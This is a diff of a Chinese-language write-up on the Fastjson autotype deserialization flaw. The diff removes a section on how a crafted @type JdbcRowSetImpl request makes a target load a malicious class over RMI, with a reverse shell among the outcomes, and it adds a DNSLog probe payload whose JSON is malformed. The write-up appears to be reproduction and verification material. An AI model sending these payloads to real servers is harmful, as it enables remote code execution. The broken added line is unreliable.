@@ -56,27 +56,6 @@ class iphone implements Fruit {
 
 
 
-## **Fastjson漏洞原理**
-利用Fastjson的autotype机制在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类的中方法连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。
-^
-请求包的请求体JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来把JSON内容反序列化成@type指定的对象，并且会调用这个对象的setter或者getter方法。
-此时@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。
-
-常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用，
-因此整个漏洞复现的原理过程就是：
-```
-1. 攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，
-以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。
-2. 存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，
-靶机服务器就会向rmi服务器请求待执行的命令。
-也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？
-3. rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，
-提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），
-得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell等）
-4. rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。
-5. 靶机服务器执行了恶意代码，被攻击者成功利用。
-```
-![](https://img-bc.icode.best/26de9fc36b2940c6882491c5453db571.png)
 ^
 ## **漏洞利用和验证**
 请求包：
@@ -87,6 +66,8 @@ class iphone implements Fruit {
 {"@type":"java.net.InetAddress","val":"x166os.dnslog.cn"}
 
 {"@type":"java.net.Inet4Address","val":"2qytvx.ceye.io"}
+
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"wefewffw.dnslog.cn"}}
 ```
 1.2.24的POC：
 @type指定为官方的类，可以远程方法调用。
